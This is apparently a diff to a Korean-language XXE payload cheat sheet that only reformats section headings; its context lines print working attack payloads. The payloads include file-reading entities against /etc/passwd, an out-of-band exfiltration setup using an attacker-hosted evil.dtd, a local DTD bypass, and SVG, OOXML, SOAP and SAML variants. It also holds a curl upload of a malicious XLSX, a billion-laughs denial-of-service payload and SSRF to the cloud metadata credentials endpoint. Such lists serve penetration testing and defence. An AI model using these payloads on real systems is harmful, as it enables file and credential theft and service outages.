@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**Classic XXE (직접 반영):**
+#### Classic XXE (직접 반영)
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -9,7 +9,7 @@
 <root>&xxe;</root>
 ```
 
-**Blind XXE (외부 콜백):**
+#### Blind XXE (외부 콜백)
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -18,7 +18,7 @@
 <root>&xxe;</root>
 ```
 
-**Parameter entity OOB 추출:**
+#### Parameter entity OOB 추출
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -36,7 +36,7 @@ evil.dtd (콜백 서버 호스팅):
 %exfil;
 ```
 
-**Local DTD 우회 (네트워크 차단 환경):**
+#### Local DTD 우회 (네트워크 차단 환경)
 ```xml
 <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
@@ -50,21 +50,21 @@ evil.dtd (콜백 서버 호스팅):
 ]>
 ```
 
-**XInclude (DOCTYPE 금지 시):**
+#### XInclude (DOCTYPE 금지 시)
 ```xml
 <root xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/hostname"/>
 </root>
 ```
 
-**SVG 업로드 XXE:**
+#### SVG 업로드 XXE
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
 <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
 ```
 
-**OOXML XXE (XLSX/DOCX 내부):**
+#### OOXML XXE (XLSX/DOCX 내부)
 ```bash
 unzip sample.xlsx -d tmp/
 # tmp/xl/sharedStrings.xml에 DOCTYPE + ENTITY 삽입
@@ -72,7 +72,7 @@ zip -r evil.xlsx tmp/
 curl -X POST "https://target/api/import" -F "file=@evil.xlsx"
 ```
 
-**SOAP XXE (WS-Security):**
+#### SOAP XXE (WS-Security)
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE soap:Envelope [
@@ -83,14 +83,14 @@ curl -X POST "https://target/api/import" -F "file=@evil.xlsx"
 </soap:Envelope>
 ```
 
-**SAML XXE (saml-scanner 결합):**
+#### SAML XXE (saml-scanner 결합)
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <samlp:Response>...&xxe;...</samlp:Response>
 ```
 
-**Billion laughs (DoS 변형):**
+#### Billion laughs (DoS 변형)
 ```xml
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
@@ -101,7 +101,7 @@ curl -X POST "https://target/api/import" -F "file=@evil.xlsx"
 <lolz>&lol9;</lolz>
 ```
 
-**SSRF (외부 fetch만):**
+#### SSRF (외부 fetch만)
 ```xml
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
